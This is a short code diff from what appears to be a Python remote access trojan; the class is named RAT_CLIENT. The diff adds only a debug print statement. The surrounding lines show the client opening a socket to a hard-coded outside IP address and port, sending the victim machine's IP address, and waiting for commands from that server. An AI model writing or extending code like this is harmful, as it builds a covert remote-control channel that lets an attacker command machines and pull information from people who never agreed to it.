@@ -47,6 +47,7 @@ class RAT_CLIENT:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect(('138.68.79.95', 1431))
+                print ("dfdsf")
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
                 command = s.recv(1024).decode()
